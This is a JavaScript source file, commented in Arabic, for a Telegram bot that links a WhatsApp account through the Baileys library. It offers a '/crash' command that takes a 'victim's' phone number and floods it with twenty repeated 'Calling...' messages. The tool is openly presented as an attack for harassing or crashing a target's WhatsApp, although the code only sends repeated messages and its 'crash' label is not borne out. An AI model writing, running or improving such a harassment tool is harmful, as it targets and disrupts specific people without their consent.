const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');

// --- حط التوكن الجديد بتاع التليجرام هنا ---
const TELEGRAM_TOKEN = 'ضع_التوكن_الجديد_هنا';

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
let waSocket = null;
let isConnected = false;
let waitingFor = null;

async function linkWhatsApp(phone, chatId) {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_' + phone);
    
    waSocket = makeWASocket({
        printQRInTerminal: false,
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    if (!waSocket.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await waSocket.requestPairingCode(phone);
                bot.sendMessage(chatId, `🔗 *كود الربط بتاعك:*\n\`${code}\`\n\nافتح واتساب -> أجهزة مرتبطة -> ربط جهاز -> الربط بكود.`, { parse_mode: 'Markdown' });
            } catch (err) {
                bot.sendMessage(chatId, `❌ خطأ: ${err.message}`);
            }
        }, 3000);
    }

    waSocket.ev.on('creds.update', saveCreds);
    waSocket.ev.on('connection.update', (update) => {
        if (update.connection === 'open') {
            isConnected = true;
            bot.sendMessage(chatId, '✅ تم ربط الواتساب بنجاح! البوت جاهز.');
        } else if (update.connection === 'close') {
            isConnected = false;
        }
    });
}

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, 'أهلاً بك.\n1. /link لربط رقمك.\n2. /crash لتشغيل الكراش.\n3. /status للحالة.');
});

bot.onText(/\/link/, (msg) => {
    waitingFor = 'link';
    bot.sendMessage(msg.chat.id, '📱 أرسل رقم واتسابك الآن (بدون + أو 00):');
});

bot.onText(/\/crash/, (msg) => {
    if (!isConnected) return bot.sendMessage(msg.chat.id, '❌ لازم تربط الواتساب الأول (/link).');
    waitingFor = 'crash';
    bot.sendMessage(msg.chat.id, '🎯 أرسل رقم الضحية (بدون + أو 00):');
});

bot.onText(/\/status/, (msg) => {
    bot.sendMessage(msg.chat.id, isConnected ? '✅ الواتساب متصل.' : '❌ الواتساب غير متصل.');
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text ? msg.text.trim() : '';

    if (waitingFor === 'link' && text && !text.startsWith('/')) {
        waitingFor = null;
        await linkWhatsApp(text, chatId);
    }

    if (waitingFor === 'crash' && text && !text.startsWith('/')) {
        waitingFor = null;
        if (!isConnected || !waSocket) return bot.sendMessage(chatId, '❌ الواتساب مش متصل.');
        
        bot.sendMessage(chatId, `🚀 بدء إرسال طلبات اتصال سريعة للرقم ${text}...`);
        let count = 0;
        for (let i = 0; i < 20; i++) {
            try {
                await waSocket.sendMessage(text + '@s.whatsapp.net', { text: 'Calling...' });
                count++;
            } catch (err) {}
            await new Promise(r => setTimeout(r, 1000));
        }
        bot.sendMessage(chatId, `✅ تم إرسال ${count} طلب اتصال.`);
    }
});

console.log('Bot is running...');
